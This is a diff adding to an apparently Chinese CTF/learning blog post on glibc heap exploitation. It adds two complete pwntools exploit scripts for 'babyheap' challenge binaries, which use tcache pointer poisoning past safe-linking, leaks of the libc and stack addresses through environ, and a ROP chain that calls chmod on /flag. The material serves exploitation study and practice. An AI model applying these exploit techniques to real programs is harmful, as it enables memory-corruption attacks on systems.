@@ -17,6 +17,7 @@ comments: true
   - [2.1 利用malloc/free机制修改某个区间的值,并利用tcachebin机制泄露值](#21-利用mallocfree机制修改某个区间的值并利用tcachebin机制泄露值)
   - [2.2 劫持栈返回地址](#22-劫持栈返回地址)
   - [2.3 heap overlapping](#23-heap-overlapping)
+    - [2.3.1 heap overlapping获得libc地址,继而获得stack地址，实现ROP](#231-heap-overlapping获得libc地址继而获得stack地址实现rop)
 
 
 # 1. glibc 2.32 safe-linking<br>
@@ -250,7 +251,181 @@ p.interactive()
 ```
 
 ## 2.3 heap overlapping<br>
+**依靠堆溢出+heap overlapping机制，修改next指针**<br>
+```python
+from pwn import *
+context.log_level = 'debug'
+context.arch = 'amd64'
+context.os = 'linux'
 
+binary_path = './babyheap_level19.1'
+libc_path = './libc.so.6'
+
+p = process(binary_path)
+
+def malloc(idx,size):
+    p.recvuntil(b"[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): ")
+    p.sendline(b"malloc")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"Size: ")
+    p.sendline(str(size).encode())
+
+def free(idx):
+    p.recvuntil(b"[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): ")
+    p.sendline(b"free")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+
+def read_flag():
+    p.recvuntil(b"[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): ")
+    p.sendline(b"read_flag")
+
+def safe_write(idx):
+    p.recvuntil(b"[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): ")
+    p.sendline(b"safe_write")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+
+def safe_read(idx,content):
+    p.recvuntil(b"[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): ")
+    p.sendline(b"safe_read")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+    sleep(0.1)
+    p.send(content)
+
+# get heap_base
+malloc(0,0x20)
+free(0)
+malloc(0,0x20)
+safe_write(0)
+p.recvline()
+heap_base = u64(p.recv(8)) <<12
+log.success(f"heap_base: {hex(heap_base)}")
+
+# overlapping the chunk
+malloc(0,0x248)
+malloc(1,0x248)
+malloc(2,0x248)
+free(2)
+free(1) # 1-> 2
+safe_read(0,b"a"*0x248+p64(0x251)+p64((heap_base>>12)^(heap_base+0x8c0))) # now 1->0
+malloc(1,0x248) 
+read_flag() # 0 points the flag
+safe_write(0)
+# gdb.attach(p)
+# pause()
+p.interactive()
+```
+
+### 2.3.1 heap overlapping获得libc地址,继而获得stack地址，实现ROP<br>
+**核心思路：libc中有一个environ变量存储了stack地址；因此，得知libc基址也就等于得知了stack地址**<br>
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20250310210048.png)
+
+```python
+from pwn import *
+context.log_level = 'debug'
+context.arch = 'amd64'
+context.os = 'linux'
+
+binary_path = './babyheap_level20.1'
+libc_path = './libc.so.6'
+
+p = process(binary_path)
+
+def malloc(idx,size):
+    p.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+    p.sendline(b"malloc")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"Size: ")
+    p.sendline(str(size).encode())
+
+def free(idx):
+    p.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+    p.sendline(b"free")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+
+def safe_write(idx):
+    p.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+    p.sendline(b"safe_write")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+
+def safe_read(idx,content):
+    p.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
+    p.sendline(b"safe_read")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+    sleep(0.1)
+    p.send(content)
+
+# get heap_base
+malloc(0,0x20)
+free(0)
+malloc(0,0x20)
+safe_write(0)
+p.recvline()
+heap_base = u64(p.recv(8)) <<12
+log.success(f"heap_base: {hex(heap_base)}")
+# gdb.attach(p,"b *$rebase(0x18D5)")
+# pause()
+
+# heap_overlapping to get libc_addr
+malloc(0,0x28)
+malloc(1,0x28)
+malloc(2,0x28)
+free(2)
+free(1) # 1->2
+safe_read(0,b"a"*0x28+p64(0x31)+p64((heap_base>>12)^(heap_base+0x320))) # 1-> address(stores libc addr)
+malloc(1,0x28)
+malloc(2,0x28)
+safe_write(2)
+p.recvline()
+p.recv(24)
+libc_base = u64(p.recv(8)) - 0x21a6a0
+log.success(f"libc_base: {hex(libc_base)}")
+
+# heap_overlapping to get stack_addr
+environ_addr = libc_base + 0x221200
+malloc(0,0x28)
+malloc(1,0x28)
+malloc(2,0x28)
+free(2)
+free(1) # 1->2
+safe_read(0,b"a"*0x28+p64(0x31)+p64((heap_base>>12)^(environ_addr))) # 1-> address(stores stack addr)
+malloc(1,0x28)
+malloc(2,0x28)
+safe_write(2)
+p.recvline()
+stack_addr = u64(p.recv(8))
+log.success(f"stack_addr: {hex(stack_addr)}")
+
+# heap_overlapping to hijack the stack ret addr
+stack_ret_addr = stack_addr - 0x120 - 0x8 # -0x8's purpose is to align
+malloc(0,0x58)
+malloc(1,0x58)
+malloc(2,0x58)
+free(2)
+free(1) # 1->2
+safe_read(0,b"a"*0x58+p64(0x31)+p64((heap_base>>12)^(stack_ret_addr))) # 1-> stack_ret_addr
+malloc(1,0x58)
+malloc(2,0x58) # now 2 is the pointer to stack_ret
+
+# ROP to get flag
+libc = ELF(libc_path)
+libc.address = libc_base
+pop_rdi_ret = libc_base + 0x000000000002a3e5
+pop_rsi_ret = libc_base + 0x000000000002be51
+pop_rdx_ret = libc_base + 0x00000000000796a2
+chmod_addr = libc.symbols["chmod"]
+payload = b"a"*8+p64(pop_rdi_ret)+p64(stack_ret_addr+48)+p64(pop_rsi_ret)+p64(511)+p64(libc.symbols["chmod"])+b"/flag\x00\x00\x00"
+safe_read(2,payload)
+
+p.interactive()
+```
 
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
